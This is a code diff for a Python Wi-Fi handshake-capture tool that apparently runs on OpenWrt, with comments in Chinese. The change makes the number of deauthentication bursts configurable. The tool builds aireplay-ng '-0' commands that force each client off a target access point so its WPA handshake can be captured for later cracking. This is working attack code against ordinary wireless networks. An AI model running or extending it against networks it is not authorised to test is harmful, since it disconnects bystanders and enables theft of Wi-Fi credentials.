@@ -149,6 +149,7 @@ class OpenWrtHandshakeCapture:
         heal_link=None,
         *, group_targets=(),
         defer_analysis=False,
+        deauth_batches=5,
     ):
         """采集单个目标的原始 CAP，默认被动等待。
 
@@ -259,7 +260,7 @@ class OpenWrtHandshakeCapture:
                         client_macs = live
                         clients_by_target[active_target.bssid] = live
                     sent = self._deauth_clients(
-                        active_bssid, client_macs, monitor_interface, cancel_event
+                        active_bssid, client_macs, monitor_interface, cancel_event, batches=deauth_batches
                     )
                     # 只统计真正发出过帧的轮数，空转（无在线客户端）不计入。
                     if sent:
@@ -424,7 +425,7 @@ class OpenWrtHandshakeCapture:
                 return self._ordered_client_macs(point)
         return ()
 
-    def _deauth_clients(self, bssid, client_macs, monitor_interface, cancel_event):
+    def _deauth_clients(self, bssid, client_macs, monitor_interface, cancel_event, *, batches=5):
         """对给定客户端逐个发送定点去认证小包，返回成功轮数。
 
         每条都是打完即退的短命令，没有常驻进程可管理；轮与轮之间检查取消，
@@ -437,18 +438,20 @@ class OpenWrtHandshakeCapture:
         interface = str(monitor_interface or "").strip()
         if not interface:
             return 0
+        try:count = max(1, min(20, int(batches)))
+        except (TypeError, ValueError):count = _DEAUTH_COUNT
         sent = 0
         for mac in client_macs:
             if cancel_event is not None and cancel_event.is_set():
                 raise RuntimeError("定向握手抓包已取消。")
             command = (
                 "aireplay-ng "
-                f"-0 {_DEAUTH_COUNT} -a {quote_argument(bssid)} "
+                f"-0 {count} -a {quote_argument(bssid)} "
                 f"-c {quote_argument(mac)} {quote_argument(interface)} "
                 "--ignore-negative-one"
             )
             result = self.command_runner.run(
-                "deauth_client", command, timeout=15, cancel_event=cancel_event
+                "deauth_client", command, timeout=max(15,count+10), cancel_event=cancel_event
             )
             if result.cancelled:
                 raise RuntimeError("定向握手抓包已取消。")
